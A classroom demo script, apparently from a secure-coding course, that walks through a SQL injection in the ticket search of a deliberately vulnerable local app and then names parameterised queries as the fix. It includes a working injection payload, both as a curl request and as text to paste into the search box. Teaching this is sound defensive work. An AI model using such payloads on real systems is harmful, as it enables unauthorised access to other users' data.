# Demo 01: SQL injection — ticket search (`GET /api/tickets?search=`)

Goal: show how a “harmless” search box becomes a data exposure vulnerability when untrusted input is concatenated into SQL.

## Prereqs

- TrustyTickets running (see `00-setup-trustytickets.md`)
- You have `bob.cookies` (logged in as Bob)

Set base URL if needed:

```bash
export TT_BASE="http://localhost:5005"
```

---

## 1) Show normal behaviour

As Bob, list tickets normally:

```bash
curl -s -b bob.cookies "$TT_BASE/api/tickets"
```

Talking points:

- Bob should normally see only tickets he owns or is assigned to.
- Access control is being enforced (at least at the “happy path” level).

---

## 2) Trigger SQL injection via search

Use a payload that breaks out of the `LIKE '%...%'` clause and forces the WHERE to always be true:

```bash
curl -i -s -b bob.cookies \
  "$TT_BASE/api/tickets?search=%25%27%20)%20OR%201%3D1%20--%20"
```

What this URL-decoded payload looks like:

```text
%' ) OR 1=1 -- 
```

Expected result:

- HTTP `200 OK`
- The response includes tickets Bob should not normally be allowed to see (e.g. Alice’s ticket).

---

## 3) Explain why it worked (say this)

- The server builds SQL like: `... LIKE '%{search}%' ...`
- Your payload closes the string and injects `OR 1=1`.
- The `--` comments out the rest of the SQL on that line.

Key takeaway:

- **Input validation is not the fix.**
- The fix is **parameterised queries / ORM query APIs** (Module 4).

---

## Optional: show it through the UI

1. Open `tickets.html`
2. Log in as **bob**
3. Paste the payload into the search box:

```text
%' ) OR 1=1 -- 
```

You should see tickets that Bob should not see.

